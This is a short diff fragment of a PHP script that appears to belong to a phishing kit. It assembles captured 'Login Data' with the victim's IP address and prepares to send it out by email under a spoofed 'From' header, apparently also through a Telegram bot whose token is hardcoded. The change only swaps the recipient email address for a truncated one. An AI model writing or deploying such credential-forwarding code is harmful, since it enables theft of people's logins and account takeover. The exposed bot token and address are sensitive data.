@@ -21,7 +21,7 @@ $message .= "IP      : ".$ip."\n";
 
 $message .= "******* End Login Data *******\n\n\n\n\n";
 
-$send = "elabdill91@gmail.com";
+$send = "@gmail.com";
 $subject = "SG|".$ip."".countryinfo($message);
 $headers = "From:  Login <don@mox.fr>";
 $token = "5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks";
